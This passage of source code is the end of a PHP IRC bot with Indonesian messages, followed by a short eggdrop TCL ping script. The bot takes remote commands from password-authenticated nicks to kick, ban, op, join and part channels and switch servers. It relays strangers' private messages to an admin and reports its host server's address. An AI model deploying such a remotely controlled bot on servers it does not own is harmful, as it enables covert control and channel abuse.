             else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :You`re Logout! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :You`re Already Logout! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <passsword> untuk mengatur password anda ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User telah ada! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Mohon auth dulu! Ketik: auth <password> ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :Tadi kan udah! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga boleh tuh! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':!say' && $com[4] && $chan) {
                 $msg = strstr($data,":!say");
                 $msg = str_replace(":!say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':!act' && $com[4] && $chan) {
                 $msg = strstr($data,":!act");
                 $msg = str_replace(":!act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':!slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' pake bibir gorila xixixixixi.... :p'. CRL);
               }
               elseif ($com[3]==':!msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!msg");
                 $msg = str_replace(":!msg $com[4] ","",$msg);

                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!notice");
                 $msg = str_replace(":!notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!ctcp");
                 $msg = str_replace(":!ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':!ping' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG! '.$sml. CRL);
               }
               elseif ($com[3]==':!pong' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PING! '.$sml. CRL);
               }
               elseif ($com[3]==':!info') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $bruri = $_SERVER['REQUEST_URI'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | Referer: $bruri | IP: $bip | Your IP: $brip Port:$brport" . CRL);
                }
               }
               elseif ($com[3]==':!up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':!down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':!part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]!="User") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]!="User") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':!k' && $com[4] && $chan) {
                 $msg = strstr($data,":!k");
                 $msg = str_replace(":!k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':!kb' && $com[4] && $chan) {
                 $msg = strstr($data,":!kb");
                 $msg = str_replace(":!kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':!changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':!op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!away' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':!mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':!nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':!chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':!userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!quit");
                 $msg = str_replace(":!quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT ' . CRL);
               }
               elseif ($com[3]==':!jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':!ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':!fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama ' . CRL);
               }
               elseif ($com[3]==':!topic' && $com[4] && $chan) {
                 $msg = strstr($data,":!topic");
                 $msg = str_replace(":!topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PING 12886241614'. CRLF);
                 $msgdelay = 0;
                 foreach ($helptext as $baris){
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(2) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 unset($baris);
                 unset($msgdelay);
               }
               /*** AUTO RESPONSE COMMAND BY KingSton **/
               elseif ($com[3]==':!ngomong') {
                 $ngomong = TRUE;
                 $autowelcome = TRUE;
                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION seneng deh... dah boleh ngomong sekarang.. :)'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :acik...acik... aq dah boleh ngomong... ' . CRL); }
               }
               elseif ($com[3]==':!diam') {
                 $ngomong = FALSE;
                 $autowelcome = FALSE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION huaaaaaaaa... jahat ikz... :('. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :huh... sebel deh ikz... :( ' . CRL); }
               }

             }
             else { fputs($fp,'NOTICE '.$dNick.' :Mohon auth dulu! Ketik: auth <password> '. CRL); }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand) && $log=="on") {
             fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

hajar($nick);

?>
################################################################
# Ping TCL                                                     #
# Author:                                                      #
#    FlyBoyUSA                                                 # 
#                                                              #
# Edited and add some enhancement by:                          #
#    aWaN               (admin@awan.tk)                        #
#                                                              #
# I hate ripper, so please included the copyright stuff        #
# when you modified it. at least give credit to real author    #
#                                                              #
################################################################

bind pub - !ping ping_me
bind pub - ping ping_me
bind ctcr - PING ping_me_reply

proc ping_me {nick uhost hand chan arg} {
     global pingchan pingwho
     set arg [string toupper $arg]
     if {$arg == "" || [string match "#*" $arg]} {
          puthelp "NOTICE $nick :Gunakan: !ping me atau !ping nick lain"
          return 0
     } elseif {$arg == "ME"} {
          putserv "PRIVMSG $nick :\001PING [unixtime]\001"
          set pingwho 0
          set pingchan $chan
          return 1
     } else { 
          putserv "PRIVMSG $arg :\001PING [unixtime]\001"
          set pingwho 1
          set pingchan $chan
          return 1
     }
}

proc ping_me_reply {nick uhost hand dest key arg} {
     global pingchan pingwho
     if {$pingwho == 0} {
          puthelp "PRIVMSG $pingchan :11,1LaG reply 14,1$nick : 8[expr [unixtime] - $arg] detik"
          return 0
     } elseif {$pingwho == 1} {
          puthelp "PRIVMSG $pingchan :11,1LaG reply 4,1$nick : 8[expr [unixtime] - $arg] detik"
          return 0
     }
}

############
#End of TCL#
############

putlog "- PinG Lo@Ded ©-"
